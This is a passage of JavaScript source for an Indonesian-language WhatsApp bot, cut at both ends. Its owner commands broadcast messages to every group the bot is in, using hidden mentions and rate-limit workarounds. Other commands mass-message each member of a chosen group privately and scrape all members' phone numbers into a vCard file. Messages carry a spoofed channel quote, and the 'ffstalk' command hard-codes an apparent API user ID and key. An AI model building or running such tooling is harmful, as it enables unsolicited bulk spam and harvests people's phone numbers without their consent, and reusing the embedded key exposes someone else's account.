    }
  }

  if (mediaPath) fs.unlinkSync(mediaPath)
  delete global.statusjpm

  await m.reply(`✅ JPM Channel selesai!\nTerkirim ke *${successCount}/${channelList.length}* Channel.`)
}
break

case "cekch": {
  if (!isCreator) return
  const all = [...(global.store?.chats?.array || [])]
  const ch = all.filter(c => c.id?.endsWith("@newsletter"))
  return m.reply(`Total: ${all.length}\nChannel: ${ch.length}\n\n${ch.map(c => c.id).join("\n") || "kosong"}`)
}
break

case "jasher": case "jpm": case "jaser": {
  if (!isCreator) return m.reply(mess.owner)
  if (global.statusjpm) return m.reply(`⚠️ JPM sedang berjalan, tunggu sampai selesai atau hentikan dengan .stopjpm`)
  if (!text) return m.reply(`*Contoh :* ${command} pesannya & bisa dengan foto juga`)
  if (!global.botReady) return m.reply(`⏳ Bot baru saja reconnect, harap tunggu 20 detik lalu coba lagi.`)

  let mediaPath
  if (/image/.test(mime)) {
    mediaPath = await NXL.downloadAndSaveMediaMessage(qmsg)
  }

  let allGroups
  try {
    // getGroupsCached() menunggu threshold (min 20 grup) lalu return.
    // Fetch sisa grup terus berjalan di background — loop JPM di bawah
    // membaca langsung dari global.allGroupsCache sehingga grup baru
    // yang masuk cache saat broadcast berlangsung tetap ikut terkirim.
    allGroups = await global.getGroupsCached()
  } catch (e) {
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}\nBot mungkin belum siap, tunggu sebentar lalu coba lagi.`)
  }

  // Baca blacklist
  let blacklist = []
  try {
    blacklist = loadBlacklistJpm()
  } catch {
    blacklist = []
  }

  const blacklistIds = blacklist.map(v => v.id)

  // Kirim sebagai teks/foto murni — biarkan WhatsApp di HP penerima yang render link preview secara original
  const messageContent = mediaPath
    ? { image: fs.readFileSync(mediaPath), caption: text }
    : { text }

  global.messageJpm = messageContent
  global.statusjpm = true

  const senderChat = m.chat
  const jenis = mediaPath ? "teks & foto" : "teks"

  // Snapshot awal — grup yang sudah ada di cache saat JPM dimulai
  // Loop akan extend ke grup baru yang masuk cache (dari background fetch)
  const seenIds = new Set()
  let successCount = 0
  let i = 0
  let _jpmConsecutiveErrors = 0

  // Fungsi helper: ambil ID valid dari cache saat ini yang belum dikirim
  // [FIX] Pre-filter: skip blacklist + skip grup announce (only-admin) jika bot bukan admin
  const _botNum = NXL.user.id.split(':')[0]
  const getNextId = () => {
    const liveIds = Object.keys(global.allGroupsCache || {})
    for (const id of liveIds) {
      if (seenIds.has(id)) continue
      if (blacklistIds.includes(id)) { seenIds.add(id); continue }
      // Skip grup only-admin (announce) jika bot bukan admin di grup tersebut
      const meta = global.allGroupsCache[id]
      if (meta && meta.announce) {
        const botIsAdmin = (meta.participants || []).some(p =>
          p.admin && (p.id || '').split(':')[0].replace(/@.*$/, '') === _botNum
        )
        if (!botIsAdmin) { seenIds.add(id); continue }
      }
      return id
    }
    return null
  }

  const initialCount = Object.keys(allGroups).filter(id => !blacklistIds.includes(id)).length
  await m.reply(`⏳ Memproses JPM ${jenis}...\n📋 Target: *${initialCount}* grup`)

  // Loop: kirim ke semua grup valid yang ada di cache, termasuk yang baru masuk saat loop berjalan
  while (true) {
    if (global.stopjpm) {
      delete global.stopjpm
      break
    }

    const groupId = getNextId()

    if (!groupId) {
      // Tidak ada grup lagi di cache — JPM selesai
      break
    }

    seenIds.add(groupId)
    i++

    try {
      await NXL.sendMessage(groupId, global.messageJpm, { quoted: FakeChannel })
      successCount++
      // Reset circuit breaker setelah sukses
      _jpmConsecutiveErrors = 0
    } catch (err) {
      console.error(`Gagal kirim ke grup ${groupId}:`, err)
      // [FIX] Circuit breaker: deteksi rate limit (429/428/500)
      const statusCode = err?.output?.statusCode || err?.data?.statusCode || err?.statusCode || 0
      const isRateLimit = statusCode === 429 || statusCode === 428
        || (statusCode === 500 && /429|rate/i.test(String(err?.data || err?.message || '')))
        || /rate.?overlimit|too many/i.test(String(err?.message || ''))
      if (isRateLimit) {
        _jpmConsecutiveErrors++
        if (_jpmConsecutiveErrors >= 3) {
          // Cooldown: pause 30 detik dengan polling 1s agar .stopjpm bisa interrupt
          console.log(`[JPM] Rate limit terdeteksi ${_jpmConsecutiveErrors}x berturut — cooldown 30 detik...`)
          for (let _cd = 0; _cd < 30; _cd++) {
            if (global.stopjpm) break
            await new Promise(r => setTimeout(r, 1000))
          }
          _jpmConsecutiveErrors = 0
        }
      }
    }

    // Delay — hanya jika masih ada grup berikutnya
    const hasMore = getNextId() !== null
    if (hasMore) {
      await new Promise(r => setTimeout(r, global.JedaJpm || 5000))
    }
  }

  const totalTarget = seenIds.size
  const skipped = Object.keys(global.allGroupsCache || {}).filter(id => blacklistIds.includes(id)).length

  if (mediaPath) fs.unlinkSync(mediaPath)
  delete global.statusjpm
  await NXL.sendMessage(senderChat, {
    text: `✅ JPM ${jenis} selesai!\nTerkirim ke *${successCount}/${totalTarget}* grup.\n${skipped > 0 ? `⛔ Di-skip blacklist: *${skipped}* grup` : ''}`
  }, { quoted: m })
}
break

case "jpmht": {
  if (!isCreator) return m.reply(mess.owner)
  if (global.statusjpm) return m.reply(`⚠️ JPM sedang berjalan, tunggu sampai selesai!`)
  if (!text) return m.reply(`*Contoh :* ${command} pesannya & bisa dengan foto juga`)
  if (!global.botReady) return m.reply(`⏳ Bot baru saja reconnect, harap tunggu 20 detik lalu coba lagi.`)

  let mediaPath
  if (/image/.test(mime)) {
    mediaPath = await NXL.downloadAndSaveMediaMessage(qmsg)
  }

  let allGroups
  try {
    allGroups = await global.getGroupsCached()
  } catch (e) {
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}\nBot mungkin belum siap, tunggu sebentar lalu coba lagi.`)
  }
  const groupIds = Object.keys(allGroups)

  let blacklist = []
  try {
    blacklist = loadBlacklistJpm()
  } catch {
    blacklist = []
  }

  const blacklistIds = blacklist.map(v => v.id)
  const filteredGroupIds = groupIds.filter(id => !blacklistIds.includes(id))
  const skipped = groupIds.length - filteredGroupIds.length

  const messageContent = mediaPath
    ? { image: fs.readFileSync(mediaPath), caption: text }
    : { text }

  global.messageJpm = messageContent
  global.statusjpm = true

  const senderChat = m.chat
  const jenis = mediaPath ? "teks & foto" : "teks"
  await m.reply(`⏳ Memproses JPM Hidetag ${jenis} ke *${filteredGroupIds.length}* grup...\n${skipped > 0 ? `⛔ *${skipped}* grup di-skip (blacklist)` : ''}`)

  let successCount = 0

  for (const groupId of filteredGroupIds) {
    if (global.stopjpm) {
      delete global.stopjpm
      break
    }
    messageContent.mentions = allGroups[groupId].participants.map(e => e.jid || e.id)
    try {
      await NXL.sendMessage(groupId, global.messageJpm, { quoted: FakeChannel })
      successCount++
    } catch (err) {
      console.error(`Gagal kirim ke grup ${groupId}:`, err)
    }
    await new Promise(r => setTimeout(r, global.JedaJpm || 5000))
  }

  if (mediaPath) fs.unlinkSync(mediaPath)
  delete global.statusjpm
  await NXL.sendMessage(senderChat, {
    text: `✅ JPM Hidetag ${jenis} selesai!\nTerkirim ke *${successCount}/${filteredGroupIds.length}* grup.\n${skipped > 0 ? `⛔ Di-skip blacklist: *${skipped}* grup` : ''}`
  }, { quoted: m })
}
break

case 's': case 'sticker': case 'sgif': {

if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await NXL.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await NXL.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break

case 'public': {
    if (!isCreator) return m.reply(mess.owner)
    NXL.public = true
    if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true })
    fs.writeFileSync('./database/botmode.json', JSON.stringify({ public: true }, null, 2))
    reply('*Berhasil Mengubah Ke Penggunaan Publik*')
}
break
case 'self': {
    if (!isCreator) return m.reply(mess.owner)
    NXL.public = false
    if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true })
    fs.writeFileSync('./database/botmode.json', JSON.stringify({ public: false }, null, 2))
    reply('*Sukses Berubah Menjadi Pemakaian Sendiri*')
}
break

case "setjeda": {
    if (!isCreator) return m.reply(mess.owner);

    const infoJeda = `*Contoh :*\n${command} push 5000\n${command} jpm 6000\n\nKeterangan format waktu:\n1 detik = 1000\n\nJeda waktu saat ini:\nJeda Pushkontak > ${global.JedaPushkontak}\nJeda JPM > ${global.JedaJpm}`;

    if (!text) return m.reply(infoJeda);

    let jedaArgs = text.split(" ");
    if (jedaArgs.length < 2) return m.reply(infoJeda);

    let target = jedaArgs[0].toLowerCase();
    let value = jedaArgs[1];

    if (isNaN(value)) return m.reply("Harus berupa angka!");
    let jeda = parseInt(value);

    let path = require.resolve("./settings.js");
    let data = fs.readFileSync(path, "utf-8");

    if (target === "push") {
        let newData = data.replace(/global\.JedaPushkontak\s*=\s*\d+/, `global.JedaPushkontak = ${jeda}`);
        fs.writeFileSync(path, newData, "utf-8");
        global.JedaPushkontak = jeda;
        return m.reply(`✅ Berhasil mengubah *Jeda Push Kontak* menjadi *${jeda}* ms`);
    }

    if (target === "jpm") {
        let newData = data.replace(/global\.JedaJpm\s*=\s*\d+/, `global.JedaJpm = ${jeda}`);
        fs.writeFileSync(path, newData, "utf-8");
        global.JedaJpm = jeda;
        return m.reply(`✅ Berhasil mengubah *Jeda JPM* menjadi *${jeda}* ms`);
    }

    return m.reply(`Pilihan tidak valid!\nGunakan: *push* atau *jpm*`);
}
break;

case "pushkontak":
case "puskontak": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply(`*Contoh :* ${command} pesannya`);

  global.textpushkontak = text;

  let a
  try {
    a = await Promise.race([
      NXL.groupFetchAllParticipating(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 20000))
    ])
  } catch (e) {
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}`)
  }
  const Data = Object.values(a);

  if (Data.length < 1) return m.reply("Tidak ada grup chat.");

  let rows = [];
  for (let u of Data) {
    const name = u.subject || "Unknown";
    rows.push({
      title: name,
      description: `Total Member: ${u.participants.length}`,
      id: `.pushkontak-response ${u.id}`
    });
  }

  await NXL.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'Pilih Grup' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Grup',
            sections: [
              {
                title: `© Powered By ${ownername}`,
                rows: rows
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    text: `\nPilih Target Grup Pushkontak\n`
  }, { quoted: m });
}
  break;

case "pushkontak-response": {
  if (!isCreator) return m.reply(mess.owner)
  if (global.statuspush) return m.reply(`⚠️ Pushkontak sedang berjalan, tunggu sampai selesai!`)
  if (!global.textpushkontak) return m.reply(`Data teks pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak* pesannya`);

  const teks = global.textpushkontak
  const jidawal = m.chat

  const groupId = text.trim()
  console.log("Group ID:", groupId)

  let data
  try {
    data = await NXL.groupMetadata(groupId)
  } catch (e) {
    console.log("Error groupMetadata:", e.message)
    return m.reply(`Gagal ambil data grup!\nError: ${e.message}`)
  }

  console.log("Participants sample:", data.participants[0])

  const halls = data.participants
  .map(v => v.jid || v.id)
  .filter(id => id && id.endsWith('@s.whatsapp.net'))
  .filter(id => id !== botNumber && id.split("@")[0] !== global.owner)

  console.log("Total halls:", halls.length)

  await m.reply(`🚀 Memulai pushkontak ke dalam grup ${data.subject} dengan total member ${halls.length}`)

  global.statuspush = true
  delete global.textpushkontak
  let count = 0

  for (const mem of halls) {
    if (global.stoppush) {
      delete global.stoppush
      delete global.statuspush
      break
    }
    await NXL.sendMessage(mem, { text: teks }, { quoted: FakeChannel })
    await global.sleep(global.JedaPushkontak)
    count += 1
  }

  delete global.statuspush
  await m.reply(`✅ Sukses pushkontak!\nPesan berhasil dikirim ke *${count}* member.`, jidawal)
}
break

case "pushkontak2":
case "puskontak2": {
  if (!isCreator) return m.reply(mess.owner)
  if (!text || !text.includes("|")) return m.reply(`Masukan pesan & nama kontak\n*Contoh :* ${command} pesan|namakontak`)

  global.textpushkontak2 = text.split("|")[0]
  global.namakontak2 = text.split("|")[1]

  let a
  try {
    a = await Promise.race([
      NXL.groupFetchAllParticipating(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 20000))
    ])
  } catch (e) {
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}`)
  }
  const Data = Object.values(a)
  if (Data.length < 1) return m.reply("Tidak ada grup chat.")

  let rows = []
  for (let u of Data) {
    const name = u.subject || "Unknown"
    rows.push({
      title: name,
      description: `Total Member: ${u.participants.length}`,
      id: `.pushkontak-response2 ${u.id}`
    })
  }

  await NXL.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'Pilih Grup' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Grup',
            sections: [
              {
                title: `© Powered By ${ownername}`,
                rows: rows
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    text: `\nPilih Target Grup PushkontakV2\n`
  }, { quoted: m })
}
break

case "pushkontak-response2": {
  if (!isCreator) return m.reply(mess.owner)
  if (global.statuspush) return m.reply(`⚠️ Pushkontak sedang berjalan, tunggu sampai selesai!`)
  if (!global.textpushkontak2) return m.reply(`Data teks pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak2* pesannya|namakontak`)

  const teks = global.textpushkontak2
  const namaKontak = global.namakontak2
  const jidawal = m.chat
  const groupId = text.trim()

  let data
  try {
    data = await NXL.groupMetadata(groupId)
  } catch (e) {
    return m.reply(`Gagal ambil data grup!\nError: ${e.message}`)
  }

  const halls = data.participants
    .map(v => v.jid || v.id)
    .filter(id => id && id.endsWith('@s.whatsapp.net'))
    .filter(id => id !== botNumber && id.split("@")[0] !== global.owner)

  if (halls.length < 1) return m.reply(`Tidak ada member yang bisa di-push.`)

  global.statuspush = true
  let count = 0

  await m.reply(`🚀 Memulai pushkontak autosave ke dalam grup *${data.subject}*\nTotal member: *${halls.length}*`)

  for (const mem of halls) {
    if (global.stoppush) {
      delete global.stoppush
      break
    }
    try {
      const nomorBersih = mem.split("@")[0]
      const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${namaKontak} #${nomorBersih}\nTEL;type=CELL;type=VOICE;waid=${nomorBersih}:+${nomorBersih}\nEND:VCARD`

      await NXL.sendMessage(mem, { text: teks }, { quoted: FakeChannel })
      await NXL.sendMessage(mem, {
        contacts: {
          displayName: `${namaKontak} #${nomorBersih}`,
          contacts: [{ vcard }]
        }
      })
      count += 1
    } catch (e) {
      console.log("Gagal ke:", mem, e.message)
    }
    await global.sleep(global.JedaPushkontak)
  }

  delete global.textpushkontak2
  delete global.namakontak2
  delete global.statuspush
  await m.reply(`✅ Sukses pushkontak!\nTotal kontak berhasil dikirim ke *${count}* dari *${halls.length}* member.`, jidawal)
  break
}

case "savenomor":
case "sv":
case "save": {
  if (!isCreator) return m.reply(mess.owner)

  let nomor, nama

  if (m.isGroup) {
    if (!text) return m.reply(`*Contoh penggunaan di grup:*\n${command} @tag|nama\natau reply target dengan:\n${command} nama`)

    if (m.mentionedJid[0]) {
      nomor = m.mentionedJid[0]
      nama = text.split("|")[1]?.trim()
      if (!nama) return m.reply(`Harap tulis nama setelah "|"\n*Contoh:* ${command} @tag|nama`)
    } else if (m.quoted) {
      nomor = m.quoted.sender
      nama = text.trim()
    } else if (/^\d+$/.test(text.split("|")[0])) {
      nomor = text.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      nama = text.split("|")[1]?.trim()
      if (!nama) return m.reply(`Harap tulis nama setelah "|"\n*Contoh:* ${command} 628xxxx|nama`)
    } else {
      return m.reply(`*Contoh penggunaan di grup:*\n${command} @tag|nama\natau reply target dengan:\n${command} nama`)
    }
  } else {
    if (!text) return m.reply(`*Contoh penggunaan di private:*\n${command} nama`)
    nomor = m.chat
    nama = text.trim()
  }

  const contactAction = {
    fullName: nama,
    lidJid: nomor,
    saveOnPrimaryAddressbook: true
  }

  const nomorBersih = nomor.split("@")[0]

const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${nama}\nTEL;type=CELL;type=VOICE;waid=${nomorBersih}:+${nomorBersih}\nEND:VCARD`

try {
  await NXL.sendMessage(m.chat, {
    contacts: {
      displayName: nama,
      contacts: [{ vcard }]
    }
  })
  return m.reply(`✅ Berhasil mengirim kontak\n\n- Nomor: ${nomorBersih}\n- Nama: ${nama}`)
} catch (e) {
  return m.reply(`❌ Gagal mengirim kontak!\nError: ${e.message}`)
}
}
break

case "savekontak":
case "svkontak": {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply(`Masukan namakontak\n*Contoh :* ${command} nama`)

  global.namakontak = text

  let a
  try {
    a = await Promise.race([
      NXL.groupFetchAllParticipating(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 20000))
    ])
  } catch (e) {
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}`)
  }
  const Data = Object.values(a)
  if (Data.length < 1) return m.reply("Tidak ada grup chat.")

  let rows = []
  for (let u of Data) {
    const name = u.subject || "Unknown"
    rows.push({
      title: name,
      description: `Total Member: ${u.participants.length}`,
      id: `.savekontak-response ${u.id}`
    })
  }

  await NXL.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'Pilih Grup' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Grup',
            sections: [
              {
                title: `© Powered By ${ownername}`,
                rows: rows
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    text: `\nPilih Target Grup Savekontak\n`
  }, { quoted: m })
}
break

case "savekontak-response": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.namakontak) return m.reply(`Data nama savekontak tidak ditemukan!\nSilahkan ketik *.savekontak* namakontak`)

  try {
    const groupId = text.trim()
    const res = await NXL.groupMetadata(groupId)

    const halls = res.participants
      .map(v => v.jid || v.id)
      .filter(id => id && id.endsWith('@s.whatsapp.net'))
      .filter(id => id !== botNumber && id.split("@")[0] !== global.owner)

    if (!halls.length) return m.reply("Tidak ada kontak yang bisa disimpan.")

    let existingContacts = []
    try {
      existingContacts = JSON.parse(fs.readFileSync('./database/contacts.json', 'utf8'))
    } catch {
      existingContacts = []
    }

    const newContacts = [...new Set([...existingContacts, ...halls])]
    fs.writeFileSync('./database/contacts.json', JSON.stringify(newContacts, null, 2))

    const vcardContent = halls.map(contact => {
      const phone = contact.split("@")[0]
      return [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:${global.namakontak} - ${phone}`,
        `TEL;type=CELL;type=VOICE;waid=${phone}:+${phone}`,
        "END:VCARD",
        ""
      ].join("\n")
    }).join("")

    fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")

    if (m.isGroup) {
      await m.reply(`Berhasil membuat file kontak dari grup *${res.subject}*\n\nFile kontak telah dikirim ke private chat\nTotal *${halls.length}* kontak`)
    }

    await NXL.sendMessage(
      m.sender,
      {
        document: fs.readFileSync("./database/contacts.vcf"),
        fileName: `${res.subject}.vcf`,
        caption: `✅ File kontak berhasil dibuat\nGrup: *${res.subject}*\nTotal: *${halls.length}* kontak`,
        mimetype: "text/vcard"
      },
      { quoted: m }
    )

    delete global.namakontak
    fs.writeFileSync("./database/contacts.json", "[]")
    fs.writeFileSync("./database/contacts.vcf", "")

  } catch (err) {
    return m.reply("Terjadi kesalahan:\n" + err.toString())
  }
}
break

case "jedajaser":
case "stopjpm": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.statusjpm) return m.reply("Jpm sedang tidak berjalan!")
  global.stopjpm = true
  return m.reply("Berhasil menghentikan jpm ✅")
}
break

case "stoppushkontak":
case "stoppush":
case "stoppus": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.statuspush) return m.reply("Pushkontak sedang tidak berjalan!")
  global.stoppush = true
  return m.reply("Berhasil menghentikan pushkontak ✅")
}
break

case "blacklistjpm":
case "bljpm": {
  if (!isCreator) return m.reply(mess.owner)

  let a
  try {
    a = await Promise.race([
      NXL.groupFetchAllParticipating(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 20000))
    ])
  } catch (e) {
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}`)
  }
  const Data = Object.values(a)
  if (Data.length < 1) return m.reply("Tidak ada grup chat.")

  let rows = []
  for (let u of Data) {
    const name = u.subject || "Unknown"
    rows.push({
      title: name,
      description: `Total Member: ${u.participants.length}`,
      id: `.bljpm-response ${u.id}`
    })
  }

  await NXL.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'Pilih Grup' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Grup',
            sections: [
              {
                title: `© Powered By ${ownername}`,
                rows: rows
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    text: `\nPilih Grup yang akan di-Blacklist JPM\n`
  }, { quoted: m })
}
break

case "bljpm-response": {
  if (!isCreator) return m.reply(mess.owner)

  const groupId = text.trim()

  let res
  try {
    res = await NXL.groupMetadata(groupId)
  } catch (e) {
    return m.reply(`Gagal ambil data grup!\nError: ${e.message}`)
  }

  let blacklist = []
  try {
    blacklist = loadBlacklistJpm()
  } catch {
    blacklist = []
  }

  if (blacklist.find(v => v.id === groupId)) {
    return m.reply(`Grup *${res.subject}* sudah ada di blacklist JPM!`)
  }

  blacklist.push({ id: groupId, name: res.subject })
  saveBlacklistJpm(blacklist)

  await m.reply(`✅ Berhasil menambahkan grup ke blacklist JPM\n\n- Grup: *${res.subject}*\n- ID: ${groupId}`)
}
break

case "listbljpm": {
  if (!isCreator) return m.reply(mess.owner)

  let blacklist = []
  try {
    blacklist = loadBlacklistJpm()
  } catch {
    blacklist = []
  }

  if (blacklist.length < 1) return m.reply("Tidak ada grup yang di-blacklist JPM.")

  const list = blacklist.map((v, i) => `${i + 1}. *${v.name}*\n    ID: ${v.id}`).join("\n\n")
  await m.reply(`📋 *List Blacklist JPM*\n\n${list}\n\nTotal: *${blacklist.length}* grup`)
}
break

case "delbljpm": {
  if (!isCreator) return m.reply(mess.owner)

  let blacklist = []
  try {
    blacklist = loadBlacklistJpm()
  } catch {
    blacklist = []
  }

  if (blacklist.length < 1) return m.reply("Tidak ada grup yang di-blacklist JPM.")

  if (!text) {
    const list = blacklist.map((v, i) => `${i + 1}. *${v.name}*`).join("\n")
    return m.reply(`Masukan nomor urut grup yang ingin dihapus\n*Contoh :* ${command} 1\n\n${list}`)
  }

  const index = parseInt(text.trim()) - 1
  if (isNaN(index) || index < 0 || index >= blacklist.length) {
    return m.reply(`Nomor tidak valid! Masukan angka 1 - ${blacklist.length}`)
  }

  const removed = blacklist.splice(index, 1)[0]
  saveBlacklistJpm(blacklist)

  await m.reply(`✅ Berhasil menghapus grup dari blacklist JPM\n\n- Grup: *${removed.name}*\n- ID: ${removed.id}`)
}
break

case "own": case "owner": {
await NXL.sendContact(m.chat, [global.owner], global.ownername, "Developer Bot", m)
}
break

case "addowner":
case "addown": {
  if (!isCreator) return m.reply(mess.owner)
  let input = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
  if (!input) return m.reply(`*Contoh penggunaan :*\nketik ${command} 6285XXX`)
  let jid = input.split("@")[0]
  const _botNum = NXL.user.id.split(":")[0] + "@s.whatsapp.net"
  if (jid == global.owner || input == _botNum) return m.reply(`Nomor ${jid} sudah menjadi ownerbot.`)
  const Own = Developer
  if (Own.includes(input)) return m.reply(`Nomor ${jid} sudah menjadi ownerbot.`)
  Own.push(input)
  await fs.writeFileSync("./database/owner.json", JSON.stringify(Own, null, 2))
  await m.reply(`Berhasil menambah owner ✅\n- ${input.split("@")[0]}`)
}
break

case "delowner":
case "delown": {
  if (!isCreator) return m.reply(mess.owner)
  let input = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
  if (!input) return m.reply(`*Contoh penggunaan :*\nketik ${command} 6285XXX`)
  const Own = Developer
  if (input.toLowerCase() === "all") {
    Own.length = 0
    await fs.writeFileSync("./database/owner.json", JSON.stringify(Own, null, 2))
    return m.reply("Berhasil menghapus semua owner ✅")
  }
  if (!Own.includes(input)) return m.reply("Nomor tidak ditemukan!")
  const index = Own.indexOf(input)
  Own.splice(index, 1)
  await fs.writeFileSync("./database/owner.json", JSON.stringify(Own, null, 2))
  await m.reply(`Berhasil menghapus owner ✅\n- ${input.split("@")[0]}`)
}
break

case "listowner":
case "listown": {
if (!isCreator) return m.reply(mess.owner)
  const Own = JSON.parse(fs.readFileSync("./database/owner.json"))
  if (Own.length < 1) return m.reply("Tidak ada owner tambahan.")

  let teks = Own.map((i, idx) => {
    const num = i.split("@")[0]
    return `${idx + 1}. ${num}`
  }).join("\n")

  return m.reply(`*Daftar Owner Tambahan*\n\n${teks}`)
}
break

case 'creategc':
case 'creategrup': {
  if (!isCreator) return onlyOwn()
  if (!args.join(" ")) return m.reply(`Contoh: ${command} namagrup`)
  try {
    let cret = await NXL.groupCreate(args.join(" "), [])
    let response = await NXL.groupInviteCode(cret.id)
    let teks2 = `*BERHASIL MEMBUAT GRUP*

• Nama: ${cret.subject}
• Owner: @${cret.owner.split("@")[0]}
• Dibuat: ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
• ID: ${cret.id}
• Link: chat.whatsapp.com/${response}`
    m.reply(teks2)
  } catch {
    m.reply('Terjadi kesalahan')
  }
}
break

case 'leavegc': {
  try {
    if (!isCreator) return m.reply(mess.owner)
    if (!m.isGroup) return m.reply(mess.group)
    await NXL.groupLeave(m.chat)
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat leave grup.')
  }
}
break

case 'joingc': {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return reply(`Contoh: ${prefix + command} https://chat.whatsapp.com/xxx`)

  if (!args[0] || !args[0].includes('chat.whatsapp.com')) return reply('Link tidak valid!')

  const result = args[0].split('chat.whatsapp.com/')[1]?.split('?')[0]
  if (!result) return reply('Link tidak valid!')

  reply(mess.wait)

  try {
    await NXL.groupAcceptInvite(result)
    reply('Sukses join ke grup!')
  } catch (err) {
    const code = err?.data || err?.output?.statusCode
    if (code === 400) return reply('Grup tidak ditemukan atau link tidak valid.')
    if (code === 401) return reply('Bot dikick dari grup tersebut.')
    if (code === 403) return reply('Bot tidak diizinkan masuk grup ini.')
    if (code === 409) return reply('Bot sudah ada di grup tersebut.')
    if (code === 410) return reply('URL grup telah direset.')
    if (code === 500) return reply('Grup penuh.')
    reply(`Gagal join: ${err.message}`)
  }
}
break

case "restart": {
  if (!isCreator) return m.reply(mess.owner)
  await m.reply(`🔄 Bot sedang restart...`)
  process.exit(0)
}
break

case 'ffstalk': {
  try {
    if (!text) return m.reply(`Contoh: ${command}ffstalk 12345678`)

    const MY_UID = 'Zh0tJcWKLpRGc9VMEugNF9jyGQc2'
    const MY_KEY = 'DciKiLzUuZmOzJRl7RuVFT8UPfZ8Tm'

    const regions = ['ID', 'SG', 'IND', 'BR', 'VN', 'TH', 'TW', 'US', 'RU', 'ME', 'PK']
    let apiUrl = null

    for (const region of regions) {
      const res = await fetchJson(
        `https://proapis.hlgamingofficial.com/main/games/freefire/account/api?sectionName=AllData&PlayerUid=${text}&region=${region}&useruid=${MY_UID}&api=${MY_KEY}`
      )
      if (res?.result?.AccountInfo) { apiUrl = res; break }
    }

    if (!apiUrl?.result) return m.reply('❌ Akun tidak ditemukan. Pastikan UID benar.')

    const acc    = apiUrl.result.AccountInfo
    const guild  = apiUrl.result.GuildInfo
    const cap    = apiUrl.result.captainBasicInfo
    const pet    = apiUrl.result.petInfo
    const social = apiUrl.result.socialinfo
    const credit = apiUrl.result.creditScoreInfo
    const outfit = apiUrl.result.AccountProfileInfo

    function getBRRank(rp) {
      if (rp >= 6000) return '🏅 Heroic'
      if (rp >= 4200) return '💎 Diamond III'
      if (rp >= 3600) return '💎 Diamond II'
      if (rp >= 3000) return '💎 Diamond I'
      if (rp >= 2400) return '🥇 Platinum III'
      if (rp >= 2100) return '🥇 Platinum II'
      if (rp >= 1800) return '🥇 Platinum I'
      if (rp >= 1500) return '🥈 Gold III'
      if (rp >= 1200) return '🥈 Gold II'
      if (rp >= 900)  return '🥈 Gold I'
      if (rp >= 600)  return '🥉 Silver III'
      if (rp >= 300)  return '🥉 Silver II'
      return '🥉 Silver I'
    }

    function getCSRank(rp) {
      if (rp >= 3000) return '🏅 Heroic'
      if (rp >= 2100) return '💎 Diamond'
      if (rp >= 1500) return '🥇 Platinum'
      if (rp >= 900)  return '🥈 Gold'
      if (rp >= 300)  return '🥉 Silver'
      return '🥉 Bronze'
    }

    function rankBar(rp, max) {
      const pct = Math.min(Math.round((rp / max) * 10), 10)
      return '█'.repeat(pct) + '░'.repeat(10 - pct)
    }

    function formatDate(ts) {
      if (!ts) return '-'
      return new Date(parseInt(ts) * 1000).toLocaleDateString('id-ID', {
        day: '2-digit', month: 'long', year: 'numeric'
      })
    }

    function timeAgo(ts) {
